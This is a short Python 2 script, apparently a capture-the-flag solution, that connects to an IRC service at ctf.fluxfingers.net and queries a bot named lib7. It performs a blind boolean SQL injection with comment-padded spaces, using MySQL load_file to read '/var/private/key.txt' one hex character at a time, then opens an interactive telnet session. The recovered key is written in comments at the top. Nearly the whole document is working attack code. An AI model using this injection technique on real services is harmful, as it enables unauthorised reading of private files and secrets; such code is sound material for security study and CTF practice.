#!/usr/bin/python

import socket
import telnetlib

# Key in hex: 353863363364333632356239343862313061383937333731663065363536343535613738653233356462353639306532643162626632336131383833643465630A
# Key: 58c63d3625b948b10a897371f0e656455a78e235db5690e2d1bbf23a1883d4ec

log_fd = open("chatlog.txt", "w")

def send_irc_line(s, line):
	log_fd.write("SEND: " + line + "\n")
	log_fd.flush()
	s.sendall(line + "\n")

def recv_line(s):
	line = ""
	b = s.recv(1)
	while(b != '\n'):
		if(b != '\r'):
			line += b
		b = s.recv(1)
	return line

def recv_irc_line(s):
	b = recv_line(s)
	log_fd.write("RECV: " + b + "\n")
	log_fd.flush()
	if(b[:6] == "PING :"):
		s.send_all("PONG :" + b[6:])
		return recv_irc_line(s)
	return b

def do_query(s, str):
	send_msg = "PRIVMSG lib7 :%s" % (str)
	send_irc_line(s, send_msg)
	response = recv_irc_line(s)
	if(response.find("(0 total)") == -1):
		return True
	return False

def is_char_at_position(s, c, pos):
	query = "details 7'/**/and/**/(select/**/mid(hex(load_file('/var/private/key.txt')),/**/%d,/**/1))='%s'/**/and/**/''='" % (pos,c)
	return do_query(s, query)


s = socket.socket()
s.connect(("ctf.fluxfingers.net", 1313))

s.sendall("""IRC
PASS secret
NICK mynick
USER mynick hostname servername :realname
""")

# recv until :irc.local 255 chop :I have 114 clients and 0 servers


d = recv_irc_line(s)
while(d.find(":irc.local 255") == -1):
	d = recv_irc_line(s)

keyspace = "0123456789ABCDEF"

for pos in range(1, 65*2+1):
	for c in keyspace:
		if(is_char_at_position(s, c, pos)):
			print "%d: %s" % (pos, c)
			break

t = telnetlib.Telnet()
t.sock = s
t.interact()